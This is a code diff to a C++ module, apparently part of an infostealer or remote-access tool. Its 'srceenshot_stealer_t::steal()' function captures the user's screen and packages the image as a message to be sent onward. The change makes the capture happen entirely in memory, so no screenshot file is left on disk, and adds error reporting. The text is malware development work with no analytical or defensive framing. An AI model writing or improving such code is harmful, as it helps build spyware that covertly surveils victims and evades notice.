@@ -9,6 +9,8 @@
 #include "gdiplusimaging.h"
 #include <fstream>
 
+#include "messages/error_message.h"
+
 asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
 {
     return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
@@ -38,19 +40,33 @@ asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
 
                 const auto FILE_NAME = "screenshot.jpeg";
 
-                // TODO refactor this shit
-                CImage image;
-                image.Attach(hBitmap);
-                image.Save(FILE_NAME);
+                std::string data;
+                {
+                    CComPtr<IStream> stream = nullptr;
+                    if(const auto result = CreateStreamOnHGlobal(nullptr, true, &stream);
+                        result == E_INVALIDARG || result == E_OUTOFMEMORY)
+                    {
+                        DLOG("Screenshot(ERROR): Cant create stream");
+                        std::move(completion_handler)(
+                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant create stream"));
+                        return;
+                    }
 
-                std::ifstream ifs(FILE_NAME, std::ios::binary);
-                DeleteFile(FILE_NAME);
-                // TODO refactor this shit
+                    CImage image;
+                    image.Attach(hBitmap);
+                    image.Save(stream, Gdiplus::ImageFormatJPEG);
+
+                    ULARGE_INTEGER data_size;
+                    IStream_Size(stream, &data_size);
+                    data.resize(data_size.LowPart, 'A');
+
+                    IStream_Reset(stream);
+
+                    IStream_Read(stream, data.data(), data.size());
+                }
 
                 auto to_ret = std::make_unique<photo_message_t>();
-                std::string data;
-                data.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                to_ret->move_to_data_and_set_path(data, FILE_NAME);
+                to_ret->move_to_data_and_set_path(std::move(data), FILE_NAME);
 
                 SelectObject(hDC, old_obj);
                 DeleteDC(hDC);
